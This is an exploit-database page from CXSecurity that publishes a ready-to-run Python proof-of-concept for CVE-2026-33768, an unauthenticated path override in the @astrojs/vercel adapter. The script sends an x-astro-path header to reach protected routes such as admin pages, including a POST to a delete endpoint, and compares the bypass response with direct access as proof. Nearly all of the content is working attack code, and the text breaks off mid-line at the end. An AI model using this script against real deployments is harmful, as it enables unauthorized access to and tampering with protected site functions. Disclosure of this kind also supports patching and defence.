---
title: astrojs/vercel < = 10.0.0 - Unauthenticated x-astro-path Header Path Override
url: https://cxsecurity.com/issue/WLB-2026040002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-03
fetch_date: 2026-04-04T04:10:22.013805
---

# astrojs/vercel < = 10.0.0 - Unauthenticated x-astro-path Header Path Override

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **astrojs/vercel <= 10.0.0 - Unauthenticated x-astro-path Header Path Override** **2026.04.03**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-33768](https://cxsecurity.com/cveshow/CVE-2026-33768/ "Click to see CVE-2026-33768")**  CWE: **[CWE-306](https://cxsecurity.com/cwe/CWE-306 "Click to see CWE-306")** | |

#!/usr/bin/env python3
# Exploit Title: @astrojs/vercel <= 10.0.0 - Unauthenticated x-astro-path Header Path Override
# CVE: CVE-2026-33768
# Date: 2026-03-25
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://astro.build
# Software Link: https://github.com/withastro/astro
# Affected: @astrojs/vercel <= 10.0.0
# Tested on: @astrojs/vercel 10.0.0
# Category: WebApps
# Platform: Vercel Serverless
# Exploit Type: Path Override / Bypass
# CVSS: 7.5 (High)
# Description: Unauthenticated path override via x-astro-path or x\_astro\_path header/query parameter in Astro Vercel adapter.
# Fixed in: @astrojs/vercel 10.0.2
# Usage:
# python3 exploit.py <base\_url> <target\_path> [original\_path] [method] [json\_data]
#
# Examples:
# python3 exploit.py https://example.vercel.app /admin/secret
# python3 exploit.py https://example.vercel.app /admin/delete /public POST '{"userId":123}'
#
# Notes:
# • Full professional exploit with protection check, response diff analysis,
# redirect detection, and support for cookies / custom headers
# • Compares direct access vs bypass to prove real success
# • Detects if redirected to login or reached protected content
import requests
import sys
import json
import difflib
from urllib.parse import urljoin
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
def get\_response(base\_url, path, headers=None, cookies=None, method="GET", data=None, allow\_redirects=True):
full\_url = urljoin(base\_url.rstrip("/") + "/", path.lstrip("/"))
req\_headers = {"User-Agent": "Mozilla/5.0 (compatible; CVE-2026-33768-PoC)"}
if headers:
req\_headers.update(headers)
try:
if method.upper() == "GET":
r = requests.get(full\_url, headers=req\_headers, cookies=cookies, timeout=15, allow\_redirects=allow\_redirects)
else:
r = requests.request(method.upper(), full\_url, headers=req\_headers, cookies=cookies, json=data, timeout=15, allow\_redirects=allow\_redirects)
return r
except Exception as e:
print(f"Error requesting {path}: {e}")
return None
def analyze\_redirect(response):
if response is None:
return "No response"
if response.is\_redirect or (300 <= response.status\_code < 400):
location = response.headers.get("Location", "Unknown")
return f"Redirected to: {location}"
return "No redirect"
def response\_diff(direct\_text, bypass\_text):
if not direct\_text or not bypass\_text:
return "Cannot compare (one response is empty)"
diff = difflib.unified\_diff(
direct\_text.splitlines(keepends=True),
bypass\_text.splitlines(keepends=True),
fromfile='Direct Access',
tofile='Bypass Access',
lineterm=''
)
diff\_text = ''.join(diff)
if diff\_text.strip():
print("\n[+] Content Difference Detected (Proof of Bypass):")
print(diff\_text[:1200])
else:
print("\n[+] No major content difference (pages may be similar or identical)")
def exploit\_astro\_vercel(base\_url, target\_path, original\_path="/public", method="GET", data=None, cookies=None, extra\_headers=None):
print(f"[+] Target URL : {base\_url}")
print(f"[+] Original Path : {original\_path}")
print(f"[+] Target Path : {target\_path}")
print(f"[+] Method : {method}\n")
# Step 1: Direct access (to check protection)
print("[+] 1. Testing direct access to protected path...")
direct\_resp = get\_response(base\_url, target\_path, cookies=cookies, method=method, data=data)
if direct\_resp:
print(f" Status: {direct\_resp.status\_code}")
print(f" Redirect: {analyze\_redirect(direct\_resp)}")
direct\_text = direct\_resp.text
else:
direct\_text = ""
# Step 2: Bypass attempt
print("\n[+] 2. Attempting path override bypass...")
bypass\_headers = {"x-astro-path": target\_path}
if extra\_headers:
bypass\_headers.update(extra\_headers)
bypass\_resp = get\_response(
base\_url,
original\_path,
headers=bypass\_headers,
cookies=cookies,
method=method,
data=data
)
if bypass\_resp:
print(f" Bypass Status: {bypass\_resp.status\_code}")
print(f" Redirect: {analyze\_redirect(bypass\_resp)}")
bypass\_text = bypass\_resp.text
else:
bypass\_text = ""
# Step 3: Analysis
print("\n" + "="\*70)
print("ANALYSIS & PROOF")
print("="\*70)
if bypass\_resp and bypass\_resp.status\_code in (200, 201, 204):
print("SUCCESS: Bypass returned successful status code!")
if "login" in bypass\_resp.text.lower() or "auth" in bypass\_resp.text.lower():
print("WARNING: Response contains login/auth keywords - may still be blocked")
else:
print("Strong indication that protected content was reached!")
response\_diff(direct\_text, bypass\_text)
else:
print("Bypass did not return success status.")
if bypass\_resp:
print("\n[+] First 800 characters of bypass response:")
print(bypass\_resp.text[:800])
if \_\_name\_\_ == "\_\_main\_\_":
banner()
if len(sys.argv) < 3:
print("Usage: python3 exploit.py <base\_url> <target\_path> [original\_path] [method]")
print("Example:")
print(" python3 exploit.py https://target.vercel.app /admin/dashboard")
print(" python3 exploit.py https://target.vercel.app /admin/delete /api/health POST")
sys.exit(1)
base\_url = sys.argv[1]
target\_path = sys.argv[2]
original\_path = sys.argv[3] if len(sys.argv) > 3 else "/public"
method = sys.argv[4] if len(sys.argv) > 4 else "G...